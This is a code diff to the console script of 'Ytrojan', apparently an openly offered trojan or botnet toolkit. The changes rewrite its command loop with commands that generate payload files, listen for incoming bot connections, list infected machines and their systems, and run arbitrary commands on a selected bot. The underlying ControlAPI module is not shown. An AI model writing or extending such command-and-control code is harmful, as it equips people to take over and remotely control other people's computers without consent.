@@ -1,32 +1,39 @@
+import threading
 import ControlAPI
 
-if "__main__" == __name__:
-    print("""
-          __   ___             _             
-          \ \ / / |_ _ __ ___ (_) __ _ _ __  
-           \ V /| __| '__/ _ \| |/ _` | '_ \ 
-            | | | |_| | | (_) | | (_| | | | |
-            |_|  \__|_|  \___// |\__,_|_| |_|
-                            |__/                
-                                        V 1.1.0.20220827
-        
-            www.github.com/ycy20090311/Ytrojan
-    """)
+print("""
+\033[31m __   ___             _             \033[0m             
+\033[32m \ \ / / |_ _ __ ___ (_) __ _ _ __  \033[0m
+\033[33m  \ V /| __| '__/ _ \| |/ _` | '_ \ \033[0m
+\033[34m   | | | |_| | | (_) | | (_| | | | |\033[0m
+\033[35m   |_|  \__|_|  \___// |\__,_|_| |_|\033[0m
+\033[36m                   |__/             \033[0m   
+\033[37m                                    \033[0m
+\033[38m                         V 1.3.0.202211 \033[0m
+""")
 
-    while True:
-        cmd = input("Ytrojan $>").split()
-        if cmd[0] == "generate":
-          parameters = input("parameters $>").split()
-          ControlAPI.generate(int(cmd[1]),cmd[2],cmd[3],int(cmd[4]),parameters)
-        elif cmd[0] == "connect":
-          control = ControlAPI.Control(cmd[1],int(cmd[2]))
-          control.connect()
-        elif cmd[0] == "listen":
-          control = ControlAPI.Control(cmd[1],int(cmd[2]))
-          control.listen()
-        elif cmd[0] == "exit":
-          exit(0)
+while True:
+    Command = input("Ytrojan $>")
+    if Command.split()[0] == "generate":
+        Return = ControlAPI.Generate(Command.split()[1],Command.split()[2],Command.split()[3])
+        if Return != "no":
+            print("\033[32m[INFO] The file is generated successfully \033[0m")
         else:
-          print(f"Does not contain {cmd[0]} commands")
+            print("\033[31m[ERROR] File generation failed \033[0m")
+    
+    elif Command.split()[0] == "listen":
+        threading.Thread(target=ControlAPI.Listen,args=(Command.split()[1],)).start()
+        print("\033[32m[INFO] Open %s Port \033[0m" % Command.split()[1])
+    
+    elif Command.split()[0] == "botnet":
+        BotSockets = list(ControlAPI.BotNet.keys())
+        print("\033[32m[INFO] Botint | system\033[0m")
+        for BotSocket in ControlAPI.BotNet:
+            print("%s  |  %s" % (BotSockets.index(BotSocket),ControlAPI.BotNet[BotSocket]))
+    
+    elif Command.split()[0] == "run":
+        print(ControlAPI.Run(BotSockets[int(Command.split()[1])],Command.split(" ",2)[2]))
+    
+
 
 
